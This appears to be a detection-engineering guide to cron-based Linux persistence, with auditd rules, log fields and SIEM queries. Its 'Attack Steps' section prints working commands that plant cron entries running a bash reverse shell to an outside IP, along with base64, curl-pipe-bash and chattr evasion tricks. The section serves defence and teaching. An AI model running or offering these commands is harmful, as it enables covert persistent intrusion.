# Persistence

## Scheduled Task/Job: Cron

### Technique Overview

`cron` is the standard Unix/Linux job scheduler, present on virtually every Linux distribution. It executes commands or scripts at defined intervals using a time-based syntax stored in configuration files called crontabs. The `crond` daemon runs as root and continuously monitors these files, executing jobs at their scheduled times.

Adversaries abuse cron because it provides a reliable, native, low-noise persistence mechanism. Once a malicious cron entry is planted, it will survive reboots, user logouts, and many remediation efforts that focus on process-level cleanup. Cron persistence does not require a persistent network connection — the payload executes on schedule regardless of whether a C2 channel is active.

There are several distinct variants of cron-based persistence, each with different privilege requirements and detection surfaces:

- **User crontabs** (`crontab -e` / `/var/spool/cron/crontabs/<user>`): Per-user scheduled jobs that execute with the privileges of the owning user. Any user can create and modify their own crontab without elevated privileges.

- **System crontab** (`/etc/crontab`): A system-wide crontab readable and writable only by root. It includes an additional username field specifying which user runs each job, allowing root to schedule tasks under any identity.

- **Cron drop-in directories** (`/etc/cron.d/`, `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`): Directories where scripts or crontab-format files are placed and automatically executed by `crond` or `run-parts`. Root access is required to write to these locations.

- **Root crontab** (`/var/spool/cron/crontabs/root` or `/var/spool/cron/root`): Root's personal crontab. Modification requires root access and provides full system-level persistence.

The broad availability of cron, its legitimate administrative use, and its integration with the OS make it a persistent favorite among both opportunistic attackers and sophisticated threat actors.

### Attack Steps

1. **Establish a foothold**: The attacker has initial access to the target system — either via a web shell, SSH with stolen credentials, exploited service, or existing session — with at minimum a low-privileged user account.

2. **Prepare the payload**: The attacker stages the malicious script or binary they want cron to execute. Common choices include:

   ```bash
   # Drop a reverse shell script
   echo '#!/bin/bash' > /tmp/.sys_update.sh
   echo 'bash -i >& /dev/tcp/203.0.113.45/4444 0>&1' >> /tmp/.sys_update.sh
   chmod +x /tmp/.sys_update.sh
   ```

   The payload is often placed in inconspicuous locations such as `/tmp/`, `/var/tmp/`, hidden directories (e.g., `/home/user/.cache/`), or disguised with system-sounding names.

3. **Plant the cron entry**: Depending on available privileges, the attacker chooses the appropriate cron location:

   **Option A — User crontab (no elevated privileges required):**
   ```bash
   # Write directly to avoid interactive editor
   (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.sys_update.sh") | crontab -
   ```

   **Option B — System cron drop-in (requires root):**
   ```bash
   echo '*/5 * * * * root /tmp/.sys_update.sh' > /etc/cron.d/sysupdater
   chmod 644 /etc/cron.d/sysupdater
   ```

   **Option C — Append to /etc/crontab (requires root):**
   ```bash
   echo '*/5 * * * * root /bin/bash -c "bash -i >& /dev/tcp/203.0.113.45/4444 0>&1"' >> /etc/crontab
   ```

   **Option D — Direct edit of root crontab file (requires root):**
   ```bash
   echo '*/5 * * * * /tmp/.sys_update.sh' >> /var/spool/cron/crontabs/root
   chmod 600 /var/spool/cron/crontabs/root
   ```

4. **Verify execution**: The attacker optionally confirms the job is scheduled and operational:
   ```bash
   crontab -l                     # List current user's crontab
   ls -la /etc/cron.d/            # List system cron drop-ins
   cat /var/log/syslog | grep CRON  # Verify cron executed the job
   ```

5. **Trigger and callback**: At the next scheduled interval (e.g., every 5 minutes), `crond` spawns the payload. If the payload is a reverse shell, it calls back to attacker-controlled infrastructure. Because cron re-executes on schedule, the attacker regains access even if their previous session was terminated.

6. **Optional — Obfuscate or harden the entry**: Sophisticated attackers may:
   - Base64-encode the command to avoid string matching: `echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8..." | base64 -d | bash`
   - Use `curl` or `wget` to fetch and execute a remote script, enabling payload updates without modifying the crontab
   - Set file attributes to make the crontab file immutable: `chattr +i /etc/cron.d/sysupdater`
   - Use environment variable manipulation within crontab to set `PATH` and avoid detection by path-based controls

### Detection Opportunities

- **Crontab File Creation/Modification (High Fidelity)**: New files written to `/etc/cron.d/`, modifications to `/etc/crontab`, or changes to files in `/var/spool/cron/crontabs/` are high-confidence indicators. These locations rarely change outside of legitimate software package installations. Any write event from a non-package-manager process (not `dpkg`, `rpm`, `apt`, `yum`, `dnf`) warrants investigation.

- **User Crontab Modification via `crontab` Command (Medium Fidelity)**: Monitor for execution of `crontab -e` or `crontab -l` followed by writes to `/var/spool/cron/crontabs/<user>`. In production server environments, direct user crontab modification by non-administrator users is uncommon and worth reviewing, though it can generate false positives on developer workstations.

- **`crond` Spawning Unusual Child Processes (High Fidelity)**: The `cron` or `crond` process spawning shells (`bash`, `sh`, `dash`) that subsequently make network connections is a very strong indicator. Legitimate cron jobs rarely establish outbound TCP connections to external IPs. Baseline known cron jobs and alert on any deviation.

- **Network Connections from `crond`-spawned Processes (High Fidelity)**: Any process whose ancestor is `crond` establishing an outbound connection to a non-internal IP, particularly on unusual ports (e.g., 4444, 1337, 8080, 443 to unknown hosts), should be treated as a high-priority alert.

- **Cron Job Referencing Suspicious Paths (Medium Fidelity)**: Parse crontab file contents for references to `/tmp/`, `/dev/shm/`, `/var/tmp/`, or hidden directories (`.` prefix). Legitimate cron jobs almost exclusively reference scripts in `/usr/local/bin/`, `/opt/`, or well-known service directories — not world-writable temp locations.

- **Encoded or Obfuscated Commands in Crontab (High Fidelity)**: Presence of `base64 -d`, `eval`, `|bash`, `curl ... | bash`, or `wget ... | sh` patterns within crontab files is highly suspicious. Legitimate cron jobs call named scripts, not inline evaluation chains.

- **Cron Drop-in Files Installed by Non-Package Processes (Medium Fidelity)**: Files appearing in `/etc/cron.d/` that were not created by a known package manager and do not match expected patterns (no changelog, no associated package metadata) represent anomalous software installation behavior.

- **Evasion Techniques**:
  - Attackers may use `at` or `anacron` instead of `cron` to avoid crontab-specific monitoring
  - Crontab entries may use environment variable references or indirect script wrappers to obscure final payload intent
  - `chattr +i` can be used to make crontab files immutable, causing modifications to silently fail during incident response
  - Payloads may be hosted remotely (`curl | bash`) so no malicious binary needs to persist on disk
  - Timing can be set to low-frequency intervals (e.g., `@reboot` or once weekly) to reduce execution noise
  - Entries may be inserted into legitimate-looking crontab files maintained by real services

- **False Positives**: System administrators regularly add cron jobs for backup operations, log rotation, monitoring agents, and software updates. Security tools (e.g., CrowdStrike, auditd, AIDE) also modify cron-related files during installation. Baseline all expected cron activity before tuning alerts.

### Data Sources & Log Fields

**auditd (Linux Audit Framework):**

- `SYSCALL` — `openat`, `write`, `rename` on crontab paths:
  - `syscall`: System call number (correlate to `openat`/`write`/`rename`)
  - `exe`: Path of the process making the syscall (e.g., `/usr/bin/crontab`, `/bin/bash`)
  - `uid` / `auid`: Effective UID and audit UID (login UID) of the actor
  - `key`: Custom audit rule key (e.g., `cron_modification`)
  - `name`: Full file path being accessed

  Example auditd rules to enable:
  ```bash
  # Monitor writes to system crontab files and directories
  -w /etc/crontab -p wa -k cron_modification
  -w /etc/cron.d/ -p wa -k cron_modification
  -w /etc/cron.hourly/ -p wa -k cron_modification
  -w /etc/cron.daily/ -p wa -k cron_modification
  -w /etc/cron.weekly/ -p wa -k cron_modification
  -w /etc/cron.monthly/ -p wa -k cron_modification
  -w /var/spool/cron/crontabs/ -p wa -k cron_modification
  
  # Monitor crontab binary execution
  -w /usr/bin/crontab -p x -k crontab_exec
  ```

- `EXECVE` — Arguments passed to executed processes (used to capture full command lines)
  - `a0`, `a1`, `a2`, ...: Argument values for the executed command

**syslog / journald (cron execution logs):**

- Cron execution events are logged to `/var/log/syslog` (Debian/Ubuntu) or `/var/log/cron` (RHEL/CentOS) with the `CRON` facility:
  - `CMD`: The exact command that was executed
  - `USER`: The user under which the job ran
  - `PID`: Process ID of the cron job

  Query with journald:
  ```bash
  # View all cron execution events
  journalctl -u cron --since "24 hours ago"
  
  # Filter for specific user's cron jobs
  journalctl -u cron -g "username"
  
  # View cron log directly (Debian/Ubuntu)
  grep CRON /var/log/syslog | tail -100
  
  # View cron log (RHEL/CentOS/Fedora)
  grep CRON /var/log/cron | tail -100
  ```

**EDR Process Telemetry:**

- `process_start` events where `process.parent.name == "cron"` or `process.parent.name == "crond"`:
  - `process.name`: Name of the child process (`bash`, `sh`, `python3`, `perl`, etc.)
  - `process.command_line`: Full command line executed by cron
  - `process.parent.name`: Should be `cron` or `crond`
  - `process.parent.pid`: PID of the cron daemon
  - `user.name`: User context for the executed job
  - `process.executable`: Full path to the executed binary

**Network Telemetry (if available via EDR or eBPF):**

- `network_connection` events:
  - `process.name`: Process establishing the connection
  - `process.ancestors`: Chain of parent processes (look for `crond` in ancestry)
  - `network.destination.ip`: External IP address
  - `network.destination.port`: Destination port (flag unusual ports)
  - `network.protocol`: TCP/UDP

**File Integrity Monitoring (FIM):**

- Monitor file modification events on:
  - `/etc/crontab`
  - `/etc/cron.d/*`
  - `/etc/cron.{hourly,daily,weekly,monthly}/*`
  - `/var/spool/cron/crontabs/*`
  - Relevant fields: `file.path`, `file.hash.sha256` (for change detection), `process.name` (writing process), `user.name`

**Artifacts to monitor:**
- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`
- `/etc/cron.daily/*`
- `/etc/cron.weekly/*`
- `/etc/cron.monthly/*`
- `/var/spool/cron/crontabs/*`
- `/var/spool/cron/*` (on RHEL-family distributions)

### Pseudocode Queries

**High Fidelity: Crontab File Written by Non-Package-Manager Process**
```
event.type == "file_write" AND
file.path MATCHES "(/etc/cron\.d/.*|/etc/crontab|/var/spool/cron/crontabs/.*)" AND
process.name NOT IN ["dpkg", "rpm", "apt", "yum", "dnf", "crontab", "puppet", "chef-client", "ansible"]
```

**High Fidelity: New File Created in System Cron Directory**
```
event.type == "file_create" AND
file.path MATCHES "/etc/cron\.(d|hourly|daily|weekly|monthly)/.*" AND
process.name NOT IN ["dpkg", "rpm", "apt", "yum", "dnf", "puppet", "chef-client", "ansible"]
```

**High Fidelity: Cron-Spawned Process Making Outbound Network Connection**
```
event.type == "network_connection" AND
process.ancestors MATCHES ".*(crond|cron).*" AND
network.destination.ip NOT IN [internal_ip_ranges] AND
network.direction == "outbound"
```

**High Fidelity: Encoded or In-Line Shell Execution via Cron**
```
event.type == "process_start" AND
process.parent.name IN ["cron", "crond"] AND
process.command_line MATCHES ".*(base64 -d|eval|curl.*\|.*bash|wget.*\|.*sh|/dev/tcp/).*"
```

**Medium Fidelity: Crontab Command Executed by Non-Root User on Server**
```
event.type == "process_start" AND
process.name == "crontab" AND
process.command_line MATCHES ".*(crontab\s+-[eli]).*" AND
user.name NOT IN [known_admin_users]
```

**Medium Fidelity: Cron Job Referencing World-Writable or Temp Paths**
```
event.type == "process_start" AND
process.parent.name IN ["cron", "crond"] AND
process.command_line MATCHES ".*(/tmp/|/var/tmp/|/dev/shm/).*"
```

**Medium Fidelity: Shell Spawned by Cron with Interactive or Reverse-Shell Flags**
```
event.type == "process_start" AND
process.parent.name IN ["cron", "crond"] AND
process.name IN ["bash", "sh", "dash", "zsh"] AND
process.command_line MATCHES ".*(-i|>&|/dev/tcp|/dev/udp).*"
```

**Behavioral: Cron Job Spawning Unusual Child Process Lineage**
```
// Detects cron spawning interpreters that then spawn additional shells or network tools
event.type == "process_start" AND
process.parent.name IN ["cron", "crond"] AND
process.name IN ["python", "python3", "perl", "ruby", "php", "node"] AND
// Child of that process then spawns a shell or network tool
// (Requires process tree correlation in SIEM/EDR)
process.command_line MATCHES ".*(socket|subprocess|exec|popen|os\.system).*"
```

**Behavioral: Rapid Succession of Identical Cron Job Executions (Beacon Pattern)**
```
// Detect high-frequency cron callbacks suggesting short-interval persistence
event.type == "process_start" AND
process.parent.name IN ["cron", "crond"] AND
process.command_line == [same_command_seen_multiple_times_within_10_minutes]
// Group by process.command_line, count > 3 in 10 min window
```

### MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
|--------|--------------|----------------|
| Persistence | T1053.003 | Scheduled Task/Job: Cron |
| Execution | T1053.003 | Scheduled Task/Job: Cron |
| Privilege Escalation | T1053.003 | Scheduled Task/Job: Cron |
